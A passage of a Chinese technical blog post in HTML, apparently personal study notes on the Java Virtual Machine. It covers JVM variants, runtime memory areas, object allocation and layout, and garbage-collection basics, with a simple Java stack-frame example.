Machine）指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。</p>\n</blockquote>\n<p>但不同于其他虚拟机的是，JVM模拟的是一个无法直接在硬件设备上安装的计算机系统——究其根本，它就是一个在各个系统中具有基本相同行为的<strong>跨平台程序</strong>，它提供了一系列可供Java语言调用的API，而这些API都可以溯源到<strong>本地方法</strong>(也就是native修饰的方法)。这些方法在native语言层面实现，且在不同的系统上有着不同逻辑的实现。但抽象到java语言层面，它们的作用是一致的。</p>\n<p>就这样，JVM为我们在各个系统提供了一个具有统一“系统“的虚拟机环境，我们不需要让外部的实际系统认识我们的编译出来的软件，我们只需要让JVM认识它就可以了。每当我们使用<code>java -jar</code>命令运行一个jar文件, 实际上都先运行了JVM，再由JVM来<strong>运行时</strong>的解释并加载jar包中的类文件，并通过META-INF中的主类信息找到主类并执行其中的main方法。</p>\n<p>因此，我们使用Java等依赖于JVM的语言编写程序时如果只调用Java语言为我们提供的API，我们编写的代码就可以在一切支持JVM的系统上运行。正所谓 <em><strong>Write once, run anywhere</strong></em>。你会发现很多直接编译为native的语言(C, C++, Rust, Go…)甚至需要在对应的系统编译才能运行，这也正是JVM系语言相对于其他语言的优势之一。</p>\n<h2 id=\"JVM的种类\"><a href=\"#JVM的种类\" class=\"headerlink\" title=\"JVM的种类\"></a>JVM的种类</h2><p>这里介绍主要的几种</p>\n<h3 id=\"Sun-Classic-VM\"><a href=\"#Sun-Classic-VM\" class=\"headerlink\" title=\"Sun Classic VM\"></a>Sun Classic VM</h3><blockquote>\n<p>万物伊始</p>\n</blockquote>\n<p>其中使用的技术在今天看来已经相当原始，这款虚拟机的使命也早已终结，但凭它”世界上第一款商用Java虚拟机“的头衔，便足以让它被历史铭记。</p>\n<h3 id=\"HotSpot-VM\"><a href=\"#HotSpot-VM\" class=\"headerlink\" title=\"HotSpot VM\"></a>HotSpot VM</h3><blockquote>\n<p>武林盟主</p>\n</blockquote>\n<p>毫无疑问是当今被最广泛使用的Java虚拟机</p>\n<h3 id=\"Graal-VM\"><a href=\"#Graal-VM\" class=\"headerlink\" title=\"Graal VM\"></a>Graal VM</h3><blockquote>\n<p>明日之星</p>\n</blockquote>\n<p>创造性的将字节码编译为另一种中间媒介，同时支持将其他语言编译为这种中间媒介，实现多语言之间的相互调用，JVM将不再专属于字节码。举个例子，我们甚至可以在Java中使用Node.js的Express框架来开发后端程序。</p>\n<h3 id=\"Dalvik-VM\"><a href=\"#Dalvik-VM\" class=\"headerlink\" title=\"Dalvik VM\"></a>Dalvik VM</h3><blockquote>\n<p>为Android而生</p>\n</blockquote>\n<blockquote>\n<p>Dalvik是<a href=\"https://baike.baidu.com/item/Google/86964\">Google</a>公司自己设计用于Android平台的<a href=\"https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E6%9C%BA/104440\">虚拟机</a>。Dalvik虚拟机是Google等厂商合作开发的Android移动设备平台的核心组成部分之一。它可以支持已转换为 .dex（即Dalvik Executable）格式的Java应用程序的运行，.dex格式是专为Dalvik设计的一种<a href=\"https://baike.baidu.com/item/%E5%8E%8B%E7%BC%A9%E6%A0%BC%E5%BC%8F/2844535\">压缩格式</a>，适合内存和处理器速度有限的系统。Dalvik 经过优化，允许在有限的内存中同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux 进程执行。独立的进程可以防止在虚拟机崩溃的时候所有程序都被关闭。</p>\n<p>很长时间以来，Dalvik虚拟机一直被用户指责为拖慢安卓系统运行速度不如IOS的根源。</p>\n<p>2014年6月25日，Android L 正式亮相于召开的谷歌I/O大会，Android L 改动幅度较大，<a href=\"https://baike.baidu.com/item/%E8%B0%B7%E6%AD%8C/117920\">谷歌</a>将直接删除Dalvik，代替它的是传闻已久的ART。</p>\n</blockquote>\n<h3 id=\"ART\"><a href=\"#ART\" class=\"headerlink\" title=\"ART\"></a>ART</h3><blockquote>\n<p>ART(Android Runtime)是Android 4.4发布的，用来替换Dalvik虚拟，Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART，DVM从此退出历史舞台。</p>\n</blockquote>\n<p><strong>Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码。</strong></p>\n<blockquote>\n<p>Dalvik执行的是dex字节码，依靠JIT编译器去解释执行，运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后在执行，但是将dex字节码翻译成本地机器码是发生在应用程序的运行过程中，并且应用程序每一次重新运行的时候，都要重新做这个翻译工作，因此，即使采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。 安卓运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者重新将自己的应用直接编译成目标机器码，也就是说，应用程序仍然是一个包含dex字节码的apk文件。所以在安装应用的时候，dex中的字节码将被编译成本地机器码，之后每次打开应用，执行的都是本地机器码。移除了运行时的解释执行，效率更高，启动更快。（安卓在4.4中发布了ART运行时）</p>\n</blockquote>\n<p>ART优点:</p>\n<ul>\n<li>系统性能显著提升</li>\n<li>应用启动更快、运行更快、体验更流畅、触感反馈更及时</li>\n<li>续航能力提升</li>\n<li>支持更低的硬件</li>\n</ul>\n<p>ART缺点:</p>\n<ul>\n<li>更大的存储空间占用，可能增加10%-20%</li>\n<li>更长的应用安装时间</li>\n</ul>\n<blockquote>\n<p>应廖老师的要求，讲讲ART的GC</p>\n</blockquote>\n<p>// TODO 内容好多，我太难了</p>\n<h2 id=\"自行编译JDK8\"><a href=\"#自行编译JDK8\" class=\"headerlink\" title=\"自行编译JDK8\"></a>自行编译JDK8</h2><p>非常麻烦，看看有没有时间去做。自行编译jvm可以对jvm打断点，还是很有帮助的。</p>\n<p>// TODO</p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><p>对于从事C，C++程序开发的开发人员，在内存管理领域，他们需要手动分配/释放内存。虽然这是一件繁琐的工作，但这也使C++等一系列需要手动管理内存的语言能做到更多的事情。例如MMKV，它的底层原理使用C++实现——手动管理了一块堆外内存。(但其实Java也并非做不到这个，Unsafe类中提供了手动分配/释放堆外内存的方法，并且提供了跟C++一样的面向指针的操作方法。)</p>\n<p>得益于JVM强大的内存管理机制，JVM语言程序员不需要手动为每个对象分配/释放堆内存，一切看起来相当美好。但正是因为我们将内存管理的程序交给了JVM，一旦出现内存泄漏的问题，如果不清楚JVM内存管理机制的原理就很难解决问题。</p>\n<h3 id=\"运行时数据区\"><a href=\"#运行时数据区\" class=\"headerlink\" title=\"运行时数据区\"></a>运行时数据区</h3><p>Java虚拟机在执行Java程序的过程中会把它管理的内存划分为若干个不同的数据区域:</p>\n<p><img src=\"http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png\" alt=\"Java虚拟机运行时数据区\"></p>\n<h4 id=\"程序计数器\"><a href=\"#程序计数器\" class=\"headerlink\" title=\"程序计数器\"></a>程序计数器</h4><p>程序计数器占用了比较小的一块内存空间，可以看作是<strong>当前线程</strong>所执行字节码的行号(字节码的行号，不是代码的行号，字节码应该包含有对应代码行数的信息)指示器。字节码解释器在工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令, 它是<strong>程序控制流</strong>的指示器，流程控制，异常处理，线程恢复都需要依赖它来实现。</p>\n<p>Java虚拟机的多线程是通过<strong>线程轮流切换，分配处理器时间</strong>实现的，因此在任何一个确定的时刻，一个内核都只会执行一条线程中的指令（即并发执行)。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个程序计数器。因此程序计数器是<strong>线程私有</strong>的。</p>\n<p><strong>—这里稍微讲讲Java的线程调度 &amp; 协程—</strong></p>\n<p>这里引用一段别人的话，上面我可能表述得不是很准确</p>\n<blockquote>\n<p>因为Java的多线程也是依靠时间片轮转算法进行的，因此一个CPU同一时间也只会处理一个线程，当某个线程的时间片消耗完成后，会自动切换到下一个线程继续执行，而当前线程的执行位置会被保存到当前线程的程序计数器中，当下次轮转到此线程时，又继续根据之前的执行位置继续向下执行。</p>\n</blockquote>\n<blockquote>\n<p><strong>单核</strong>的CPU是一种假的多线程，因为在一个时间单元内，也只能执行一个线程的任务。同时间段内有多个线程需要CPU去运行时，CPU也只能交替去执行多个线程中的一个线程，但是由于其执行速度特别快，因此感觉不出来。</p>\n</blockquote>\n<p>按照上面的说法，我们发现，其实线程可以看作一个任务，<strong>内核一直在很多线程之间反复横跳</strong>: 这个做一会儿就停下来，去做下一个。</p>\n<p>但这里就会出现一个问题，使用<code>Thread.sleep(long)</code>停下的线程，内核会怎么办？答案是仍然会到他身上去，但什么也不做，就白白浪费了给cpu分配的时间分片。这就是这种设计的局限性，且不说创建一个新的线程相当占内存，即便是内存足够，并发效率也相当差（其实跟Java当时刚出的时候的其他语言比起来已经很不错了）。线程池当然也会有这个问题。</p>\n<p>那么理想的状态是什么呢？我让这个线程休眠了，你cpu就不要管他，把时间分给其他有任务的线程。</p>\n<p>两条路，要么你从内核层面去改良，去教cpu做事。对应了<code>Thread#yield()</code>,让当前线程把自己的时间让给其他线程，实现<strong>抢占式调度</strong>。</p>\n<p>另外一条道路就是协程，从用户层面改良，cpu教我做事。</p>\n<blockquote>\n<p>如果你觉得Thread#sleep会浪费并发效率，那你就不要用！你要提交能充分利用我效率的任务，而不是一味的谩骂和指责。</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t—— CPU</p>\n</blockquote>\n<p>既然<code>Thread.sleep()</code>会导致并发效率低下，那我就不用！在线程下面再区分出来一个协程的概念，在这里把无用的任务过滤一遍，再交给线程。这样每个内核对每个线程的利用率就提高了，也可以提高并发效率。</p>\n<p>是不是感觉java的线程也挺像协程的:)，之前蔷神讲协程也说过线程也可以看成协程的一种实现。我个人觉得他们唯一不同的地方就在于线程是由内核来调度，处于<strong>内核态</strong>，协程由用户编写的逻辑进行调度，处于<strong>用户态</strong>。协程其实是减少了内核的<strong>无用的</strong>工作量，所以并发吞吐量更大。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-161709.jpg\"></p>\n<p><strong>—私货结束—</strong></p>\n<p>程序计数器是JVM唯一一个不会产生OOM的内存区域。</p>\n<blockquote>\n<p>在执行Java方法时，程序计数器的值为正在执行的虚拟机字节码指令的地址</p>\n<p>在执行本地方法时，程序计数器的值为空(undefined)</p>\n</blockquote>\n<h4 id=\"虚拟机栈\"><a href=\"#虚拟机栈\" class=\"headerlink\" title=\"虚拟机栈\"></a>虚拟机栈</h4><p>其实大家应该都知道所谓堆和栈的概念吧。即便Jvm的堆和栈你没有了解过，在C/C++课上应该也了解过堆栈的概念吧？虽然C++这种直接编译到native的语言中的堆和栈与Jvm语言中的堆和栈并不是一个东西——JVM是virtual machine，是虚拟机，它的一切特性都是软件模拟的。C++中我们执行程序直接使用硬件的堆栈，而Java我们执行程序使用JVM为我们模拟出来的堆栈。</p>\n<p>与程序计数器一样，虚拟机栈也是线程私有的, 它的生命周期与线程相同，随线程的释放而释放。每当一个方法被调用，虚拟机都会同步创建一个栈帧用于存储<strong>局部变量表，操作数栈，动态连接，方法出口</strong>等信息。每一个方法从调用到返回的过程就对应着一个栈帧入栈到出栈的过程。</p>\n<p>这里从别人那里抄来了一个流程图解</p>\n<blockquote>\n<p>可能听起来有点懵逼，这里我们来模拟一下整个虚拟机栈的运作流程，先编写一个测试类：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&gt;</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">return</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n       <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当我们的主方法执行后，会依次执行三个方法<code>a() -&gt; b() -&gt; c() -&gt; 返回</code></p>\n<p>可以看到在编译之后，我们整个方法的最大操作数栈深度、局部变量表都是已经确定好的，当我们程序开始执行时，会根据这些信息封装为对应的栈帧，我们从<code>main</code>方法开始看起：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg\" alt=\"image-20220131142625842\"></p>\n<p>接着我们继续往下，调用方法<code>a()</code>，这时当前方法就不会继续向下运行了，而是去执行方法<code>a()</code>，那么同样的，将此方法也入栈，注意是放入到栈顶位置，<code>main</code>方法的栈帧会被压下去：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg\" alt=\"image-20220131143641690\"></p>\n<p>这时，进入方法a之后，又继而进入到方法b，最后在进入c，因此，到达方法c的时候，我们的虚拟机栈变成了：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg\" alt=\"image-20220131144209743\"></p>\n<p>现在我们依次执行方法c中的指令，最后返回a+b的结果，在方法c返回之后，也就代表方法c已经执行结束了，栈帧4会自动出栈，这时栈帧3就得到了上一栈帧返回的结果，并继续执行，但是由于紧接着马上就返回，所以继续重复栈帧4的操作，此时栈帧3也出栈并继续将结果交给下一个栈帧2，最后栈帧2再将结果返回给栈帧1，然后栈帧1就可以继续向下运行了，最后输出结果。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg\" alt=\"image-20220131144955668\"></p>\n</blockquote>\n<p>虚拟机栈并不是无限大的，如果其中堆积的栈帧数量太多就会<strong>爆栈</strong>(StackOverFlowException)，我们可以通过<code>-Xss size</code>的vm options设置虚拟机的栈大小。</p>\n<p>常见关于虚拟机栈的问题:</p>\n<p>垃圾回收是否涉及栈内存？</p>\n<ul>\n<li><strong>不涉及</strong>，垃圾回收只涉及堆内存。在方法返回后其对应的栈帧就会出栈，所以不需要回收内存。</li>\n</ul>\n<p>栈内存分配得越大越好吗?</p>\n<ul>\n<li><strong>不</strong>，栈内存大了，其他的内存区域就小了。有时你对递归调用并没有这么大的需求，毕竟所有的递归调用都可以通过循环实现。</li>\n</ul>\n<h4 id=\"本地方法栈\"><a href=\"#本地方法栈\" class=\"headerlink\" title=\"本地方法栈\"></a>本地方法栈</h4><p>本地方法栈其实跟虚拟机栈的作用非常相似，只是他们一个为字节码层面的方法服务，一个为本地方法服务。</p>\n<h4 id=\"Java堆\"><a href=\"#Java堆\" class=\"headerlink\" title=\"Java堆\"></a>Java堆</h4><p>Java堆是虚拟机管理的内存中最大的一块, 用来存放对象实例。也是GC的主战场。不同于以上几个区域，Java堆是线程间共享的。所以在访问堆中存储的数据需要注意线程安全问题。</p>\n<h4 id=\"方法区\"><a href=\"#方法区\" class=\"headerlink\" title=\"方法区\"></a>方法区</h4><p>与Java堆一样是线程间共享的区域，它主要用于存储已经被虚拟机加载的<strong>类型信息，常量，静态变量，即时编译器编译后的代码缓存</strong>。虽然《Java虚拟机规范》中把方法区描述为堆的一个逻辑部分，但它却有一个别名叫做“非堆”(Non-Heap)，目的是与Java堆区分开来。</p>\n<p>你可能会听说方法区就是堆的永久代这个说法，实际不是这样的。仅仅只是因为HotSpot VM选择使用永久代来实现方法区，但实际上这是两个完全不同的概念。</p>\n<blockquote>\n<p>可能看起来有点突兀，只是写到这里的时候突然想说一下JIT（即时编译器）的工作流程</p>\n<p>这里可以发现其实jvm并非单纯解释执行字节码，而是在解释量达到一定阈值后触发即时编译，将编译后的字节码缓存到方法区，下次调用时便可以直接执行编译后的机器码。（也就是说常用的方法会被缓存为机器码）</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg\" alt=\"img\"></p>\n</blockquote>\n<p><strong>运行时常量池</strong></p>\n<p>运行时常量池是方法区的一部分。在类加载时JVM读取class文件中常量池表的信息，并把它存入运行时常量池。至于常量池表，下面我们讲字节码的时候再详细介绍，现在我们只需要知道它是存放程序运行所需的常量即可。</p>\n<p>而运行时常量池的另外一个重要特征就是具备<strong>动态性</strong>，Java并不要求常量一定只有在编译期才能产生，这点与c++不同，运行期间也可以有新的常量进入常量池。这种特性被开发人员利用得比较多的就是<code>String#intern()</code>方法。</p>\n<blockquote>\n<p>关于String#intern方法，直接使用双引号声明的字符串都会直接存储在常量池中</p>\n<p>而非通过双引号声明出来的字符串可以使用String#intern方法查询常量池中是否存在该字符串，若不存在就会将其放入常量池</p>\n<p>是不是又可以理解java的字符串对象为什么不可变了，因为我们一般获取的字符串都会存储在常量池中，如果直接对字符串对象动刀岂不是没有意义了</p>\n<p>这也是为什么不推荐直接通过String的构造方法获得一个String对象的原因，因为这样会new出来一个新对象，而非存储在常量池中的字符串</p>\n</blockquote>\n<h3 id=\"对象\"><a href=\"#对象\" class=\"headerlink\" title=\"对象\"></a>对象</h3><h4 id=\"创建对象大致流程\"><a href=\"#创建对象大致流程\" class=\"headerlink\" title=\"创建对象大致流程\"></a>创建对象大致流程</h4><h5 id=\"类加载检查\"><a href=\"#类加载检查\" class=\"headerlink\" title=\"类加载检查\"></a>类加载检查</h5><p>当jvm遇到一条字节码new指令的时候，首先将会检查这个指令的参数是否能在常量池定位到一个类的符号引用，并且检查这个符号引用代表的类是否已经被加载，解析和初始化过。如果没有，先执行相应的类加载过程。</p>\n<h5 id=\"分配内存\"><a href=\"#分配内存\" class=\"headerlink\" title=\"分配内存\"></a>分配内存</h5><ul>\n<li>指针碰撞</li>\n</ul>\n<p>​\t在Java堆规整的情况下（所有对象的地址连续），为新对象分配内存只需要把指针向空闲区域移动</p>\n<ul>\n<li>空闲列表</li>\n</ul>\n<p>​\t在Java堆内存存放分散的情况下，我们必须维护一个列表，记录哪些内存块是可用的，分配内存时从列表中找到合适的内存块，并更新表上的记录。</p>\n<p><strong>分配内存这个过程需要保证线程安全</strong>，一般采取两种做法: </p>\n<ul>\n<li>对分配内存空间的动作进行同步处理——实际上虚拟机是采用CAS配上失败重试的方式保证更新操作的原子性</li>\n<li>为每条线程预先分配一块堆内存，即本地线程分配缓冲，哪个线程要分配内存，就在哪个线程的本地缓冲区分配。本地缓冲区消耗完了才会锁同步。</li>\n</ul>\n<h5 id=\"初始化内存空间\"><a href=\"#初始化内存空间\" class=\"headerlink\" title=\"初始化内存空间\"></a>初始化内存空间</h5><p>即为对象的成员变量赋初值，没有赋初值的初始化为类型对应零值（引用类型对应null）</p>\n<h5 id=\"初始化对象头-Object-Header\"><a href=\"#初始化对象头-Object-Header\" class=\"headerlink\" title=\"初始化对象头 (Object Header)\"></a>初始化对象头 (Object Header)</h5><p>Java虚拟机需要对对象进行必要的设置，例如这个对象是哪个类的实例，如何才能找到类的元数据信息，对象的hash code(实际上会延后到调用<code>Object#hashCode()</code>才会计算)，对象的GC分代年龄等信息，这些信息会存放在对象的<strong>对象头</strong>中。</p>\n<h5 id=\"调用构造器\"><a href=\"#调用构造器\" class=\"headerlink\" title=\"调用构造器\"></a>调用构造器</h5><p>使用正常途径新建对象必不可少的环节，当然使用<code>Unsafe#allocateInstance()</code>创建对象是可以跳过这一步的。(Gson的反序列化出来的对象就是使用它新建的，所以说它不适合Kt，因为Kt的空安全检查逻辑实际上是写在构造器里的，Gson这样做直接跳过了空安全检查)</p>\n<h4 id=\"对象的内存布局\"><a href=\"#对象的内存布局\" class=\"headerlink\" title=\"对象的内存布局\"></a>对象的内存布局</h4><p>在HotSpot虚拟机中，对象在堆内存中的储存布局可以划分为三个部分: 对象头(Header)，实例数据(Instance Data)和对齐填充(Padding)。</p>\n<p>对象头中包含两类信息: 第一类是用于存储对象自身的运行时数据，如HashCode，GC分代年龄，锁状态标志，线程持有的锁，偏向线程ID，偏向时间戳等，这部分数据的长度在32位和64位的虚拟机中分别为32和64个bit，官方称它为“Mark World”。</p>\n<p>实例数据部分是对象真正存储的有效信息，即我们在程序代码中所定义的字段等内容</p>\n<p>对齐填充部分只是起到一个占位符的作用，由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，也就是说任何对象的大小都必须是8字节的倍数。对象头部分已经被精心设计为8字节的倍数（1倍或2倍）。因此，如果对象实例数据部分没有对齐的话，就需要通过对齐填充来补全。</p>\n<h4 id=\"对象的访问定位\"><a href=\"#对象的访问定位\" class=\"headerlink\" title=\"对象的访问定位\"></a>对象的访问定位</h4><p>创建对象自然是为了使用对象，我们的java程序一般通过栈上保存的<strong>reference</strong>(即引用)来操作堆上的具体对象。但Java虚拟机规范中只规定了这个reference类型是一个指向对象的引用，并没有强制要求这个引用应该如何定位，访问对象。所以对象访问方式也是由虚拟机实现而定的，主流的访问方式主要有使用<strong>句柄</strong>和<strong>指针</strong>。</p>\n<h5 id=\"句柄\"><a href=\"#句柄\" class=\"headerlink\" title=\"句柄\"></a>句柄</h5><blockquote>\n<p> 如果使用句柄访问的话，Java堆中将可能划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象的实例数据与类型数据各自具体的地址信息</p>\n</blockquote>\n<p>使用句柄来访问的最大好处是reference中存储的是稳定的句柄地址，在对象被移动（GC时移动是很普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png\" alt=\"飞书20220708-221205\"></p>\n<h5 id=\"指针\"><a href=\"#指针\" class=\"headerlink\" title=\"指针\"></a>指针</h5><blockquote>\n<p>如果直接使用指针访问的话，Java堆中对象的内存布局就必须考虑如何放置访问类型的相关信息，reference中存储的直接就是对象地址，如果只是访问对象本身的话，就不需要多一次访问的开销。</p>\n</blockquote>\n<p>直接使用指针访问的好处在与速度快，它节省了一次指针定位的开销，由于对象访问在java中非常频繁，这笔开销相当不容小觑。<strong>HotSpot</strong>虚拟机采用指针访问</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png\" alt=\"飞书20220708-221128\"></p>\n<h3 id=\"垃圾回收-GC\"><a href=\"#垃圾回收-GC\" class=\"headerlink\" title=\"垃圾回收 (GC)\"></a>垃圾回收 (GC)</h3><p>大家应该都知道这个东西，我就不介绍了，直接切入正题</p>\n<h4 id=\"引用计数算法-amp-可达性分析算法\"><a href=\"#引用计数算法-amp-可达性分析算法\" class=\"headerlink\" title=\"引用计数算法 &amp; 可达性分析算法\"></a>引用计数算法 &amp; 可达性分析算法</h4><p>在堆中存放着Java世界中几乎所有的对象实例，垃圾收集器在堆中进行回收前，第一件事就是要确定这些对象之中还有哪些”存活“着，哪些已经“死去”。下面就讲一讲比较常见的两种判断的方法。</p>\n<h5 id=\"引用计数算法\"><a href=\"#引用计数算法\" class=\"headerlink\" title=\"引用计数算法\"></a>引用计数算法</h5><p>在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就+1，引用失效时，计数器值就-1。任何时候计数器为0的对象是不可能再使用的，可以直接回收。</p>\n<p>虽然引用计数法简单高效，在大多数情况下是一个不错的算法。但主流的Java虚拟机并没有采用引用计数法进行内存管理，因为这个算法需要处理大量的意外情况——比如循环引用。</p>\n<h5 id=\"可达性分析算法\"><a href=\"#可达性分析算法\" class=\"headerlink\" title=\"可达性分析算法\"></a>可达性分析算法</h5><p>当前主流的商用应用语言（Java，C#等）的内存管理子系统都是通过<strong>可达性分析</strong>算法来判定对象是否存活。这个算法的基本思路就是通过一系列称为<strong>GC Roots</strong>的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程中走过路径称为<strong>引用链</strong>，如果某个对象到GC Roots间没有任何引用链相连，则该对象<strong>不可达</strong>，就会被判定为可回收的对象。</p>\n<p>可作为GC Roots的对象:</p>\n<ul>\n<li>在虚拟机栈中引用的对象</li>\n<li>方法区中类静态属性引用的对象 （例如Java的引用类型静态变量）</li>\n<li>方法区中常量引用的对象 （例如字符串常量池中的引用）</li>\n<li>在本地方法栈中JNI引用的对象</li>\n<li>Java虚拟机内部的引用，如<strong>基本数据类型对应的Class对象</strong>，一些常驻的异常对象（如NullPointerException）等，还有系统类加载器。</li>\n</ul>\n<p><img src=\"https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h4 id=\"引用的类型\"><a href=\"#引用的类型\" class=\"headerlink\" title=\"引用的类型\"></a>引用的类型</h4><p>实际上GC的回收策略并不死板，在剩余内存较少的时候，GC会尽可能回收多的对象来腾出更多的内存空间。那么我们要如何规定在剩余内存较少的时候才需要回收的那部分对象呢？于是在JDK1.2之后，Java对引用的概念进行了扩充，将引用分为<strong>强引用，软引用，弱引用，虚引用</strong>四种类型。</p>\n<h5 id=\"强引用\"><a href=\"#强引用\" class=\"headerlink\" title=\"强引用\"></a>强引用</h5><p>最传统的引用定义，指程序代码中普遍存在的引用赋值。只要强引用关系存在，GC就不会回收被引用的对象。</p>\n<h5 id=\"软引用\"><a href=\"#软引用\" class=\"headerlink\" title=\"软引用\"></a>软引用</h5><p>软引用用来描述一些还需要用到，但非必须的对象，在内存不足时，GC会回收掉只被软引用关联的对象。可以使用<code>SoftReference</code>类来实现软引用。</p>\n<h5 id=\"弱引用\"><a href=\"#弱引用\" class=\"headerlink\" title=\"弱引用\"></a>弱引用</h5><p>只被弱引用关联的对象只能存活到下一次GC到来前。可以使用<code>WeakReference</code>类来实现弱引用。</p>\n<h5 id=\"虚引用\"><a href=\"#虚引用\" class=\"headerlink\" title=\"虚引用\"></a>虚引用</h5><p>相当于没有引用，也没有办法通过这种引用得到关联的对象，为一个对象设置虚引用的唯一目的就是为了能在对象被回收时收到通知。可以使用<code>PhantomReference</code>类来实现虚引用。</p>\n<h4 id=\"垃圾收集算法\"><a href=\"#垃圾收集算法\" class=\"headerlink\" title=\"垃圾收集算法\"></a>垃圾收集算法</h4><h5 id=\"分代收集理论\"><a href=\"#分代收集理论\" class=\"headerlink\" title=\"分代收集理论\"></a>分代收集理论</h5><p>实际上，如果我们对堆中的每一个对象都依次判断是否需要回收，这样的效率其实是很低的，那么有没有更好地回收机制呢？第一步，我们可以对堆中的对象进行分代管理。</p>\n<p>比如某些对象，在多次垃圾回收时，都未被判定为可回收对象，我们完全可以将这一部分对象放在一起，并让垃圾收集器减少回收此区域对象的频率，这样就能很好地提高垃圾回收的效率了。</p>\n<p>因此，Java虚拟机将堆内存划分为<strong>新生代</strong>、<strong>老年代</strong>和<strong>永久代</strong>（其中永久代是HotSpot虚拟机特有的概念，在JDK8之前方法区实际上就是采用的永久代作为实现，而在JDK8之后，方法区由元空间实现，并且使用的是本地内存，容量大小取决于物理机实际大小，之后会详细介绍）这里我们主要讨论的是<strong>新生代</strong>和<strong>老年代</strong>。</p>\n<p>不同的分代内存回收机制也存在一些不同之处，在HotSpot虚拟机中，新生代被划分为三块，一块较大的Eden空间和两块较小的Survivor空间，默认比例为8：1：1，老年代的GC评率相对较低，永久代一般存放类信息等（其实就是方法区的实现）如图所示：</p>\n<p><img 